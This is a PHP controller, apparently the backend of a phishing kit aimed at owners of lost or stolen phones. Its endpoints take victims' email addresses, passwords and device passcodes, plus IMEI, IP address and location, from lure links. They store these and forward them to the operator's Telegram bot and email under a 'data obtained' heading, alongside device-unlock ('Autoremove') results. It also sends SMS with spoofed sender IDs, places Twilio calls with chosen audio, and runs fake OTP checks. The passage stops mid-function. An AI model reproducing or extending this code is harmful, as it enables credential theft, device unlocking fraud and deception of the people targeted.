<?php 
namespace App\Controllers;


require __DIR__ . '/vendor/autoload.php';
use Twilio\Rest\Client;
 use Twilio\TwiML\VoiceResponse;

use CodeIgniter\API\ResponseTrait;

use CodeIgniter\Controller;

use App\Models\Equipos_model;
use App\Models\configurar\Api_model;
use App\Models\configurar\Server_model;
use App\Models\configurar\Usuario_model;
use App\Models\configurar\Smtp_model;
use App\Models\configurar\Smsapi_model;
use App\Models\configurar\Plantillas_model;
use App\Models\Reporte_model;
use App\Models\Ipblocker_model;

class Api_rest extends Controller{
    
    use ResponseTrait;
    protected $server_model;
    protected $usuario_model;
    protected $smtp_model;
    protected $equipos_model;
    protected $api_model;
    protected $email_sender;
    protected $smsapi_model;
    protected $plantillas_model;
    protected $client;
    protected $reporte_model;
    protected $ipblocker_model;
    //protected $curlrequest;
   

    function __construct(){

      $this->server_model     = new Server_model();
      $this->usuario_model    = new Usuario_model();
      $this->smtp_model       = new Smtp_model();
      $this->equipos_model    = new Equipos_model();
      $this->api_model        = new Api_model();
      $this->smsapi_model     = new Smsapi_model();
      $this->plantillas_model = new Plantillas_model();
      $this->reporte_model    = new Reporte_model();
      $this->ipblocker_model  = new Ipblocker_model();
      $this->session       = \Config\Services::session();
      $this->email_sender  = \Config\Services::email();
      $this->client  = \Config\Services::curlrequest();
    }

    public function verify_link(){
    	$data = json_decode(file_get_contents('php://input'), true);
    	
    	$linkg = $data['link'];
    	if($this->equipos_model->verificarlink($linkg)){
    	  return $this->genericResponse($this->equipos_model->get_ingresado($linkg) , 200);	
    	}else{
    	  return $this->genericResponse('undefined_link', 500);
    	}
        
    } 

    public function notificacion_visita(){
      
       $data = json_decode(file_get_contents('php://input'), true);

       $datos = $this->api_model->get_bottelegram($data['idusuario']);
       $chatid = $datos['chatid'];
       $tokenbot = $datos['tokenbot'];

       $server_config = $this->server_model->get_server();   
       $descripcionserver = $server_config['descripcionserver'];

       $datos_user = $this->usuario_model->get_usuarioID($data['idusuario']);
       $to = $datos_user['correonoti'];
       $subject = 'Se detecto una nueva visita';

       $msg_telegram = "<b>💻 ".$descripcionserver."</b>".PHP_EOL
                      ."<b>🔔 ".$subject." 🔔</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>✔️ Detalles de la visita ✔️</b>".PHP_EOL
                      ."<b>👨‍💻 Usuario : </b>".$data['user'].PHP_EOL
                      ."<b>📧 Email : </b>".$data['email'].PHP_EOL
                      ."<b>📱 Modelo : </b>".$data['modelo'].PHP_EOL
                      ."<b>📲 Imei : </b>".$data['imei'].PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>🧭 Detalles de localización 🧭</b>".PHP_EOL
                      ."<b>🌐Dirección IP : </b>".$data['ip'].PHP_EOL
                      ."<b>🗾 Pais : </b>".$data['country'].PHP_EOL
                      ."<b>🏙 Ciudad : </b>".$data['city'].PHP_EOL
                      ."<b>📡 ISP : </b>".$data['isp'];

       $msg_email = "<b>💻 ".$descripcionserver."</b><br>"
                   ."<b>🔔 Se detecto una visita 🔔</b><br>"
                   ."<b>-----------------------------</b><br>"
                   ."<b>-----------------------------</b><br>"
                   ."<b>✔️ Detalles de la visita ✔️</b><br>"
                   ."<b>👨‍💻 Usuario : </b>".$data['user']."<br>"
                   ."<b>📧 Email : </b>".$data['email']."<br>"
                   ."<b>📱 Modelo : </b>".$data['modelo']."<br>"
                   ."<b>📲 Imei : </b>".$data['imei']."<br>"
                   ."<b>-----------------------------</b><br>"
                   ."<b>-----------------------------</b><br>"
                   ."<b>🧭 Detalles de localización 🧭</b><br>"
                   ."<b>🌐Dirección IP : </b>".$data['ip']."<br>"
                   ."<b>🗾 Pais : </b>".$data['country']."<br>"
                   ."<b>🏙 Ciudad : </b>".$data['city']."<br>"
                   ."<b>📡 ISP : </b>".$data['isp']; 
       
       $this->sendTelegram($msg_telegram, $tokenbot, $chatid);
       $this->sentEmail($msg_email, $descripcionserver, $subject,$to);
       return $this->genericResponse('success',200);
    }
    


    public function guardar_datos_autoremove(){
      
      $data = json_decode(file_get_contents('php://input'), true);

      $server_config = $this->server_model->get_server();   
      $descripcionserver = $server_config['descripcionserver'];

      $datos = $this->api_model->get_bottelegram($data['idusuario']);
      $chatid = $datos['chatid'];
      $tokenbot = $datos['tokenbot'];

      $datos_user = $this->usuario_model->get_usuarioID($data['idusuario']);
      $to = $datos_user['correonoti'];
      $subject = 'Datos recibidos';
      
      $idequipos        = $data['idequipos'];
      $email            = $data['email']; 
      $password         = $data['password']; 
      $link             = $data['link']; 
      $idusuario        = $data['idusuario'];
      $user             = $data['user']; 
      $modelo           = $data['modelo']; 
      $imei             = $data['imei']; 
      $ip               = $data['ip']; 
      $latitud          = $data['latitud']; 
      $longitud         = $data['longitud']; 
      $country          = $data['country']; 
      $capital          = $data['capital']; 
      $city             = $data['city']; 
      $isp              = $data['isp']; 
      $status_response  = $data['status_response']; 
      $response         = strip_tags($data['response']);

      $datos = array('email' => $email, 'password' => $password, 'status' => $status_response, 'idusuario' => $idusuario, 'idequipos' => $idequipos, 'response' => $data['response']);
      $this->equipos_model->update_requerimiento_autoremove($datos);
      
      
      $msg_telegram = "<b>💻 ".$descripcionserver."</b>".PHP_EOL
                      ."<b>🔔 ".$subject." 🔔</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>✔️ Detalles de la visita ✔️</b>".PHP_EOL
                      ."<b>👨‍💻 Usuario : </b>".$user.PHP_EOL                      
                      ."<b>📱 Modelo : </b>".$modelo.PHP_EOL
                      ."<b>📲 Imei : </b>".$imei.PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>🔐 Datos obtenidos 👨🏼‍💻</b>".PHP_EOL
                      ."<b>📧 Email : </b>".$data['email'].PHP_EOL
                      ."<b>🔑 Contraseña : </b>".$data['password'].PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>🧭 Detalles de localización 🧭</b>".PHP_EOL
                      ."<b>🌐Dirección IP : </b>".$data['ip'].PHP_EOL
                      ."<b>🗾 Pais : </b>".$data['country'].PHP_EOL
                      ."<b>🏙 Ciudad : </b>".$data['city'].PHP_EOL
                      ."<b>📡 ISP : </b>".$data['isp'].PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>⌚️ Autoremove 📱</b>".PHP_EOL
                      .$this->replaceTelegram($response);
     
      $msg_email = "<b>💻 ".$descripcionserver."</b><br>"
                  ."<b>🔔 ".$subject." 🔔</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>✔️ Detalles de la visita ✔️</b><br>"
                  ."<b>👨‍💻 Usuario : </b>".$user."<br>"               
                  ."<b>📱 Modelo : </b>".$modelo."<br>"
                  ."<b>📲 Imei : </b>".$imei."<br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>🔐 Datos obtenidos 👨🏼‍💻</b><br>"
                  ."<b>📧 Email : </b>".$data['email']."<br>"
                  ."<b>🔑 Contraseña : </b>".$data['password']."<br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>🧭 Detalles de localización 🧭</b><br>"
                  ."<b>🌐Dirección IP : </b>".$data['ip']."<br>"
                  ."<b>🗾 Pais : </b>".$data['country']."<br>"
                  ."<b>🏙 Ciudad : </b>".$data['city']."<br>"
                  ."<b>📡 ISP : </b>".$data['isp']."<br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>⌚️ Autoremove 📱</b><br>"
                  .$this->replaceEmail($response);
         



      
      $this->sendTelegram($msg_telegram, $tokenbot, $chatid);
      $this->sentEmail($msg_email, $descripcionserver, $subject,$to);
      return $this->genericResponse($response, 200);

    }


  public function update_type_lock(){
    $data = json_decode(file_get_contents('php://input'), true);
    $type_lock = $data['type_lock'];
    $link      = $data['link'];
    $idusuario = $data['idusuario'];
    $tipo = '';

    if($type_lock == 'p'){
      $tipo = 'ANDBLOQPATRON';
    }else if($type_lock == 'a'){
      $tipo = 'ANDBLOQALFA';
    }else if($type_lock == 'n'){
      $tipo = 'ANDBLOQNUM';
    }

    $this->equipos_model->update_type_lock($link, $idusuario,$tipo);


  }  


   public function guardar_datos_passcode(){

     $data = json_decode(file_get_contents('php://input'), true);
     $server_config = $this->server_model->get_server();   
     $descripcionserver = $server_config['descripcionserver'];

     $datos = $this->api_model->get_bottelegram($data['idusuario']);
     $chatid = $datos['chatid'];
     $tokenbot = $datos['tokenbot'];

     $datos_user = $this->usuario_model->get_usuarioID($data['idusuario']);
     $to = $datos_user['correonoti'];
     $subject = 'Datos passcode recibidos';

    $idequipos        = $data['idequipos'];
     $code_one         = $data['code_one'];
     $code_two         = $data['code_two'];
     $link             = $data['link']; 
     $idusuario        = $data['idusuario'];
     $user             = $data['user']; 
     $modelo           = $data['modelo']; 
     $imei             = $data['imei']; 
     $ip               = $data['ip']; 
     $latitud          = $data['latitud']; 
     $longitud         = $data['longitud']; 
     $country          = $data['country']; 
     $capital          = $data['capital']; 
     $city             = $data['city']; 
     $isp              = $data['isp']; 
     $status_response  = $data['status_response'];

    $datos = array('code_1' => $code_one, 'code_2' => $code_two, 'status' => $status_response, 'idusuario' => $idusuario, 'idequipos' => $idequipos);
     $this->equipos_model->update_requerimiento_passcode($datos);

       $msg_telegram = "<b>💻 ".$descripcionserver."</b>".PHP_EOL
                      ."<b>🔔 ".$subject." 🔔</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>✔️ Detalles de la visita ✔️</b>".PHP_EOL
                      ."<b>👨‍💻 Usuario : </b>".$user.PHP_EOL                      
                      ."<b>📱 Modelo : </b>".$modelo.PHP_EOL
                      ."<b>📲 Imei : </b>".$imei.PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>🔐 Datos obtenidos 👨🏼‍💻</b>".PHP_EOL
                      ."<b>⌨️ Codigo 1 : </b>".$code_one.PHP_EOL
                      ."<b>⌨️ Codigo 2 : </b>".$code_two.PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>🧭 Detalles de localización 🧭</b>".PHP_EOL
                      ."<b>🌐Dirección IP : </b>".$data['ip'].PHP_EOL
                      ."<b>🗾 Pais : </b>".$data['country'].PHP_EOL
                      ."<b>🏙 Ciudad : </b>".$data['city'].PHP_EOL
                      ."<b>📡 ISP : </b>".$data['isp'].PHP_EOL;
     
      $msg_email = "<b>💻 ".$descripcionserver."</b><br>"
                  ."<b>🔔 ".$subject." 🔔</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>✔️ Detalles de la visita ✔️</b><br>"
                  ."<b>👨‍💻 Usuario : </b>".$user."<br>"               
                  ."<b>📱 Modelo : </b>".$modelo."<br>"
                  ."<b>📲 Imei : </b>".$imei."<br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>🔐 Datos obtenidos 👨🏼‍💻</b><br>"
                  ."<b>⌨️1️⃣ Codigo 1 : </b>".$code_one."<br>"
                  ."<b>⌨️2️⃣Codigo 2 : </b>".$code_two."<br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>🧭 Detalles de localización 🧭</b><br>"
                  ."<b>🌐Dirección IP : </b>".$data['ip']."<br>"
                  ."<b>🗾 Pais : </b>".$data['country']."<br>"
                  ."<b>🏙 Ciudad : </b>".$data['city']."<br>"
                  ."<b>📡 ISP : </b>".$data['isp']."<br>";


     $this->sendTelegram($msg_telegram, $tokenbot, $chatid);
     $this->sentEmail($msg_email, $descripcionserver, $subject,$to);

     return $this->genericResponse('status_passcode', 200);

   } 


   public function enviar_sms(){

     $data = json_decode(file_get_contents('php://input'), true);
     

     $id_apisms   = $data['id_apisms'];
     $sender_id   = $data['sender_id'];
     $prefijo_sms = $data['prefijo_sms'];
     $numero_sms  = $data['numero_sms'];
     $msg_sms     = $data['msg_sms']; 
     $idequipos   = $data['idequipos'];
     $status       = '';
     $msg_status  = '';
     
     $usuario = $this->usuario_model->get_usuarioID($this->session->get("idusuario"));
     $credsms = $usuario['credsms'];
     $saldo_general = $usuario['saldo_general'];

     $sendessms = $this->api_model->get_senderid($id_apisms, $sender_id);
     $descripcion_sender    = $sendessms['descripcion'];  
     $valor_sender          = $sendessms['valor'];
     $descripcion_cliente   = $sendessms['descripcion_cliente'];

      if($saldo_general <= 0){

        return $this->respond(array('status' => 'failed', 'msg_status' => 'Créditos insuficientes para enviar el mensaje.','code' => 500));

      }elseif($saldo_general > 0){

          $smsapi = $this->smsapi_model->get_smsapi($id_apisms);
          $solicitud_url         = $smsapi['solicitud_url'];     
          $solicitud_tipo        = $smsapi['solicitud_tipo']; 
          $solicitud_token       = $smsapi['solicitud_token']; 
          $solicitud_apikey      = $smsapi['solicitud_apikey'];
          $solicitud_parametros  = $smsapi['solicitud_parametros'];
          $descripcion_respuesta = $smsapi['descripcion_respuesta'];
          $valor_respuesta       = $smsapi['valor_respuesta'];
          $usa_prefijo           = $smsapi['usa_prefijo'];
          $url_encode            = $smsapi['url_encode'];
          $costo                 = $smsapi['costo'];

          $response = $this->enviar($prefijo_sms, $numero_sms, $msg_sms, $descripcion_sender, $valor_sender, $solicitud_url, $solicitud_tipo, $solicitud_token, $solicitud_apikey, $solicitud_parametros, $descripcion_respuesta, $valor_respuesta, $usa_prefijo, $url_encode);

          if($response == 'success'){

            $status      = $response;  
            $msg_status  = 'El mensaje se envio correctamente.';
            $this->smsapi_model->save_sms($descripcion_cliente, $prefijo_sms, $numero_sms, $msg_sms, $status, $msg_status, $this->session->get("idusuario"), $idequipos);
            $datos_user = array('idusuario' => $this->session->get("idusuario"), 'saldo_general' => $saldo_general - $costo);
            $this->usuario_model->updateSaldoGeneral($datos_user);
            return $this->respond(array('status' => $response, 'code' => 200, 'msg_status' => 'El mensaje se envio correctamente.', 'creditos' => $saldo_general - $costo));

          }elseif($response == 'failed'){

            $status      = $response;  
            $msg_status  = 'Hubo un problema para enviar el mensaje.'; 
            $this->smsapi_model->save_sms($descripcion_cliente, $prefijo_sms, $numero_sms, $msg_sms, $status, $msg_status, $this->session->get("idusuario"), $idequipos);      
            return $this->respond(array('status' => $response, 'code' => 500, 'msg_status' => 'Hubo un problema para enviar el mensaje.', 'creditos' => $saldo_general));


    
          }elseif($response == 'failed_server'){
           $status      = $response;  
           $msg_status  = 'Error interno en el servidor, contacte a su administrador.';  
           $this->smsapi_model->save_sms($descripcion_cliente, $prefijo_sms, $numero_sms, $msg_sms, $status, $msg_status, $this->session->get("idusuario"), $idequipos); 
           return $this->respond(array('status' => $response, 'code' => 301, 'msg_status' => 'Error interno en el servidor, contacte a su administrador.', 'creditos' => $saldo_general));

          } 

          

      }
    
   }

   private function enviar($prefijo_sms, $numero_sms, $msg_sms, $descripcion_sender, $valor_sender, $solicitud_url, $solicitud_tipo, $solicitud_token, $solicitud_apikey, $solicitud_parametros, $descripcion_respuesta, $valor_respuesta, $usa_prefijo, $url_encode){

     $curl = \Config\Services::curlrequest();
     
     $paramtros_sms = '';
     $sms_encode = '';
     if($url_encode ==  1){
      $sms_encode = urlencode($msg_sms);
     }else{
      $sms_encode = $msg_sms;
     }
     $p1 = str_replace('#msg', $sms_encode, $solicitud_parametros); 
     $p2 = str_replace('#apikey', $solicitud_apikey, $p1); 
     $p3 = str_replace('#token', $solicitud_token, $p2); 
     $p4 = str_replace('#sender', $descripcion_sender, $p3); 
     $p5 = str_replace('#valor', $valor_sender, $p4); 

     if($usa_prefijo == 1){
      $p6 = str_replace('#prefijo', $prefijo_sms, $p5);
      $p7 = str_replace('#numero', $numero_sms, $p6); 
      $paramtros_sms = $p7;
    
     }elseif($usa_prefijo == 0){
       $p6 = str_replace('#numero', $prefijo_sms.$numero_sms, $p5);
       $paramtros_sms = $p6;
     }

     $cadena=$paramtros_sms;
     $busqueda=array(
        'array(',
        '=>',
        ')'
     );
     $reemplazo=array(
        '{',
        ':',
        '}',
     );

    $strJson=str_replace($busqueda,$reemplazo, $cadena);
    $arregloDatos=json_decode($strJson, true);
    
 
    $response_sendsms = '';
    if($solicitud_tipo == 'post'){

     try{
       $response_sendsms =  $curl->request('post',$solicitud_url, [
        'form_params' => $arregloDatos, 'headers' => ['Accept' => 'application/json']
         ]);
     }catch (\Exception $e){
         return $e->getMessage();
     } 

    }else{

      try{
       $response_sendsms =  $curl->request('get',$solicitud_url.'?'.$paramtros_sms, [ 'headers' => ['Accept' => 'application/json']]);
      }catch (\Exception $e){
         return 'failed_server';
      } 

    }

      $response = json_decode($response_sendsms->getBody(), true);
      
      if($solicitud_url == 'https://isolutionsapi.com/api/'){
         return 'success';
      }else{
       if(isset($response[$descripcion_respuesta])){

         if($response[$descripcion_respuesta] == $valor_respuesta){
             return 'success';
         }else{
          return 'failed';
         }

       }else{
        return 'failed';
       }
          
      }

 
       
   } 
   public function all_sendsms(){

    if($this->request->getPost()) {
        $idequipos = $this->request->getPost('idequipos');
        $response = $this->smsapi_model->all_sendsms($idequipos, $this->session->get("idusuario"));
        echo json_encode($response);
    }

   }


   public function eliminar_sendsms(){

     if($this->request->getPost()) {
        $id = $this->request->getPost('id');
        $response = $this->smsapi_model->eliminar_sendsms($id, $this->session->get("idusuario"));
         return $this->respond(array('status' => true, 'code' => 200));
    }

   }

   public function callcenter(){

     $data = json_decode(file_get_contents('php://input'), true);
     
     $usuario = $this->usuario_model->get_usuarioID($this->session->get("idusuario"));
     $credcall = $usuario['credcall'];
     $saldo_general = $usuario['saldo_general'];

    try{ 
     $twilio = $this->api_model->get_apitwilio();
     $accountsidtwilio = $twilio['accountsidtwilio'];
     $authtokentwilio  = $twilio['authtokentwilio'];
     $numerotwilio     = $twilio['numerotwilio'];
  
     $audio   = $data['audio'];
     $prefijo = $data['prefijo'];
     $numero  = $data['numero'];

     $sid   = $accountsidtwilio;
     $token = $authtokentwilio;
     $client = new Client($sid, $token);

    

     if($saldo_general <= 0){

        return $this->respond(array('status' => 'failed', 'msg_status' => 'Créditos insuficientes para realizar llamadas.','code' => 500, 'sid' => null));

      }elseif($saldo_general > 0){ 

          try{

            $call = $client->calls->create(
                 $prefijo.$numero, $numerotwilio,
                 ["url" => $audio]
              );
      
            return $this->respond(array('status' => 'success', 'msg_status' => 'Preparando la llamada.','code' => 200, 'sid' => $call->sid));

          }catch (\Exception $e){
            return $this->respond(array('status' => 'failed', 'msg_status' => 'Error interno en el servidor, contacte a su administrador.','code' => 301, 'sid' => null));
          } 
      }
    }catch (\Exception $e){
         //return $e->getMessage();
    }   
   }


   function callcenter_process(){
     
      //$data = json_decode(file_get_contents('php://input'), true);
      
      $sid = $this->request->getPost("sid");
      $usuario = $this->usuario_model->get_usuarioID($this->session->get("idusuario"));
      $credcall = $usuario['credcall'];
      $saldo_general = $usuario['saldo_general'];

      $twilio = $this->api_model->get_apitwilio();
      $accountsidtwilio = $twilio['accountsidtwilio'];
      $authtokentwilio  = $twilio['authtokentwilio'];
      $numerotwilio     = $twilio['numerotwilio'];
      $costo = $twilio['costo'];

      $client = new Client($accountsidtwilio, $authtokentwilio);
      $call = $client->calls($sid)->fetch();


      $response = new VoiceResponse();

      return $this->respond(array('statuscall' => $call->status, 'creditos' => $saldo_general - $costo, 'duration' => $call->duration));

   }


   public function callcenter_colgar(){

      $sid = $this->request->getPost("sid");
      $twilio = $this->api_model->get_apitwilio();
      $accountsidtwilio = $twilio['accountsidtwilio'];
      $authtokentwilio  = $twilio['authtokentwilio'];

      $client = new Client($accountsidtwilio, $authtokentwilio);

      $call = $client->calls($sid)
               ->update(array("status" => "completed"));
      return  $this->respond(array("status" => $call->status,  "sid" => $call->sid));
      
   }

   public function updatecreditos_call(){

     $usuario = $this->usuario_model->get_usuarioID($this->session->get("idusuario"));
     $credcall = $usuario['credcall'];
     $saldo_general = $usuario['saldo_general'];

     $twilio = $this->api_model->get_apitwilio();
     $accountsidtwilio = $twilio['accountsidtwilio'];
     $authtokentwilio  = $twilio['authtokentwilio'];
     $costo = $twilio['costo'];


     $datos_user = array('idusuario' => $this->session->get("idusuario"), 'saldo_general' => $saldo_general - $costo);
     $this->usuario_model->updateSaldoGeneral($datos_user);
     return  $this->respond(array('status' => 'success', 'saldo_general' => $saldo_general - $costo));

   }





    private function sentEmail($msg, $namefrom, $subject,$to){
         
      $smtp_config = $this->smtp_model->get_smtp();

      $config['protocol'] = 'mail';
      $config['SMTPHost'] = $smtp_config['smtp_host'];
      $config['SMTPUser'] = $smtp_config['smtp_username'];
      $config['SMTPPass'] = $smtp_config['smtp_password'];
      $config['SMTPPort'] = $smtp_config['smtp_puerto'];
      $config['SMTPCrypto'] = 'ssl';
      $config['mailType'] = 'html';
      $config['charset']  = 'utf-8';
      $this->email_sender->initialize($config);
      $this->email_sender->setFrom($smtp_config['smtp_username'], $namefrom);
      $this->email_sender->setTo($to);
      $this->email_sender->setSubject($subject);
      $this->email_sender->setMessage($msg);

      print_r($this->email_sender->send());
    }

     private function replaceEmail($msg){

      $resp1 = str_replace("ONLINE", "<br>❌ ONLINE", $msg);
      $resp2 = str_replace("Model", "<br>------<br>📱 Model", $resp1);
      $resp3 = str_replace("Unlocked", "<br>✅ Unlocked", $resp2);
      $resp4 = str_replace("<br>Failed", "<br>Failed ", $resp3);
      $resp5 = str_replace("<br>UnlockFailed", "<br>Unlock Failed ", $resp4);
      $resp6 = str_replace("Failed", "Failed<br>", $resp5);
      $resp7 = str_replace("<br>Removed", "<br>Removed<br>", $resp6);

      return $resp7;
    }  

  
    private function sendTelegram($msg, $tokenbot, $chatid){
      
      $url = "https://api.telegram.org/bot".$tokenbot."/sendMessage?chat_id=".$chatid."";
      $url = $url . "&parse_mode=HTML&text=". urlencode($msg);
      $ch = curl_init();
      $optArray = array(
              CURLOPT_URL => $url,
              CURLOPT_RETURNTRANSFER => true
      );
      curl_setopt_array($ch, $optArray);
      $result = curl_exec($ch);
      curl_close($ch);

      return $result;

    }

    private function replaceTelegram($msg){

      $resp1 = str_replace("ONLINE", "\n❌ ONLINE", $msg);
      $resp2 = str_replace("Model", "\n------\n📱 Model", $resp1);
      $resp3 = str_replace("Unlocked", "\n✅ Unlocked", $resp2);
      $resp4 = str_replace("\nFailed", "\nFailed ", $resp3);
      $resp5 = str_replace("\nUnlockFailed", "\nUnlock Failed ", $resp4);
      $resp6 = str_replace("Failed", "Failed\n", $resp5);
      $resp7 = str_replace("\nRemoved", "\nRemoved\n", $resp6);

      return $resp7;
    }

    private function genericResponse($data,  $code){

      if($code == 200){

        return $this->respond(array('data' => $data, 'code' => $code));

      }else{

           return $this->respond(array('data' => $data, 'code' => $code));
      }


    }



  /****************************************OPCIONES OTP**********************************/
 

  public function send_sms_otp(){

    $data = json_decode(file_get_contents('php://input'), true);      
    $link = $data['link'];  
    $prefijo = $data['prefijo'];
    $phone_number = $data['phone_number'];
    $phone_number_requirement = $data['phone_number_requirement'];
    $idusuario    = $data['idusuario'];
    $tipo_verificacion_otp = $data['tipo_verificacion_otp'];
    $id_apisms = $data['id_apisms'];
    $idsender  = $data['idsender'];
    $id_plantilla_otp = $data['id_plantilla_otp'];


    $server       = $this->server_model->get_server();
    $urlaccess    = $server['urlaccess'];
    $token_access = $server['token_access'];

    $smsapi = $this->smsapi_model->get_smsapi($id_apisms);
    $solicitud_url         = $smsapi['solicitud_url'];     
    $solicitud_tipo        = $smsapi['solicitud_tipo']; 
    $solicitud_token       = $smsapi['solicitud_token']; 
    $solicitud_apikey      = $smsapi['solicitud_apikey'];
    $solicitud_parametros  = $smsapi['solicitud_parametros'];
    $descripcion_respuesta = $smsapi['descripcion_respuesta'];
    $valor_respuesta       = $smsapi['valor_respuesta'];
    $usa_prefijo           = $smsapi['usa_prefijo'];
    $url_encode            = $smsapi['url_encode'];

    $sender = $this->api_model->get_senderid($id_apisms, $idsender);
    $descripcion_sender = $sender['descripcion'];
    $valor_sender = $sender['valor'];

    $plantilla_otp = $this->plantillas_model->getplantillaid($id_plantilla_otp);
    $descripsms = $plantilla_otp['descripsms'];

    $status = 0;
    $msg_status = "";
    $sent_status = 0;
    $code_otp_temp = "";
    $message = '';
    $response = '';

   
     if($prefijo.$phone_number != $phone_number_requirement){
  
     $status      = 0;
     $msg_status  = 'wrong_number';
     $sent_status = 0;

     return $this->respond(array('status' => $status, 'msg_status' => $msg_status, 'sent_status' => $sent_status, 'message' => $message));


     }else{

      if($tipo_verificacion_otp == 'numero'){
         $status = 1;
         $msg_status = 'code_success';
         $recibio_otp = 1;
         $codigo_otp_recibido = 'Verification';

         $this->equipos_model->update_otpnumber_equipos($recibio_otp, $codigo_otp_recibido, $link, $idusuario);
        
         return $this->respond(array('status' => $status, 'msg_status' => $msg_status, 'sent_status' => 'null', 'message' => 'null'));






      }elseif($tipo_verificacion_otp == 'sms'){

          $status        = 1;
          $msg_status    = 'generated_code';
          $sent_status   = 1;
          $codigo_otp_generado = $this->generateCode_otp(6);
          $this->equipos_model->update_codigo_otp_generado($codigo_otp_generado, $link, $idusuario);

          $message = str_replace('{{code}}', $codigo_otp_generado, $descripsms);

         // $response = $this->enviar($prefijo, $phone_number, $message, $descripcion_sender, $valor_sender, $solicitud_url, $solicitud_tipo, $solicitud_token, $solicitud_apikey, $solicitud_parametros, $descripcion_respuesta, $valor_respuesta, $usa_prefijo, $url_encode);
           $response = 'success';
          if($response == 'success'){
             return $this->respond(array('status' => $status, 'msg_status' => $msg_status, 'sent_status' => $sent_status, 'message' => $message));
           }else{
             return $this->respond(array('status' => $status, 'msg_status' => $msg_status, 'sent_status' => $sent_status, 'message' => $message));
           }
         

      }


     }

  } 

  public function send_call_otp(){

    $data = json_decode(file_get_contents('php://input'), true);  

    $link  = $data['link'];
    $phone_number_requirement = $data['phone_number_requirement'];
    $prefijo = $data['prefijo'];
    $phone_number = $data['phone_number'];
    $idusuario  = $data['idusuario'];
    $tipo_verificacion_otp = $data['tipo_verificacion_otp'];
    $id_plantilla_otp = $data['id_plantilla_otp'];
    $lenguaje_otp = $data['lenguaje_otp'];

    $twilio = $this->api_model->get_apitwilio();
    $accountsidtwilio = $twilio['accountsidtwilio'];
    $authtokentwilio  = $twilio['authtokentwilio'];
    $numerotwilio     = $twilio['numerotwilio'];

    $plantilla_otp = $this->plantillas_model->getplantillaid($id_plantilla_otp);
    $descripsms = $plantilla_otp['descripsms'];

    $status = 0;
    $msg_status = "";
    $sent_status = 0;
    $code_otp_temp = "";
    $message = '';
    $response = '';

    $status        = 1;
    $msg_status    = 'generated_code';
    $sent_status   = 1;
    $codigo_otp_generado = $this->generateCode_otp_call(6);
    
    $this->equipos_model->update_codigo_otp_generado($codigo_otp_generado, $link, $idusuario);
    $message = str_replace('{{code}}',$codigo_otp_generado,$descripsms);

    $client = new Client($accountsidtwilio, $authtokentwilio);
     
    try{

      
        $call = $client->calls->create(
            $prefijo.$phone_number, $numerotwilio,
            [
            "method" => "GET",                            
            "url" => 'https://apirest-callcenter.lgdev.us/process_otp.php?msg='.urlencode($message).'&language='.$lenguaje_otp
            ]
        );

       return $this->respond(array('call_id' =>$call->sid, 'status' => 1, 'msg_status' => 'generated_code', 'sent_status' => 1)); 
    
    }catch (\Exception $e){
      
      return $this->respond(array('error' => $e, 'status' => 0, 'msg_status' =>$e, 'sent_status' => 1));  

    }  

   

  }


  public function verify_otp(){

    $data = json_decode(file_get_contents('php://input'), true);  

    $code_otp_add = $data['code_otp_add'];
    $idusuario    = $data['idusuario'];
    $link         = $data['link'];
    $equipos = $this->equipos_model->verificarlinkuser($idusuario, $link);
    $codigo_otp_generado = $equipos['codigo_otp_generado'];
    $urlacortada = $equipos['urlacortada'];

    $status = 0;
    $msg_status = "";
    $is_received = 0;
    $received_otp_code = '';

     if($code_otp_add == $codigo_otp_generado){
    
        $status = 1;
        $msg_status = 'code_success';
        $recibio_otp = 1;
        $codigo_otp_recibido = $code_otp_add;
        $this->equipos_model->update_codigo_add($codigo_otp_recibido, $recibio_otp, $link, $idusuario);

  
     }else{

      $status = 0;
      $msg_status = 'code_failed';

     }

     return $this->respond(array('status' => $status, 'msg_status' => $msg_status,'code_otp_temp' => $codigo_otp_generado, 'is_shortened' => $urlacortada));  



  } 

  public function reset_otp(){

    if($this->request->getPost()){

      $idequipos = $this->request->getPost('idequipos');
      $idusuario = $this->session->get('idusuario');
      $codigo_otp_generado = '';
      $codigo_otp_recibido = '';
      $recibio_otp = 0;
      $response = $this->equipos_model->reset_otp($idequipos, $idusuario, $codigo_otp_generado, $codigo_otp_recibido,$recibio_otp);
      if($response){
        return $this->respond(array('status' => true));
      }else{
         return $this->respond(array('status' => false));
      }
    }
    
  }

  private function generateCode_otp($cantidad){

    return substr(str_shuffle("01234567890987654321"), 0, $cantidad);
  }

  private function generateCode_otp_call($cantidad){

    $numbers = range(0, 9);
    $random=implode(", ",array_rand(array_flip($numbers), $cantidad));
    return $random;
  }
  
  
  /*********ACCESO AL SCRIPT DE REPORTE******/

  public function notificacion_visita_reporte(){
      
       $data = json_decode(file_get_contents('php://input'), true);

       $datos = $this->api_model->get_bottelegram($data['idusuario']);
       $chatid = $datos['chatid'];
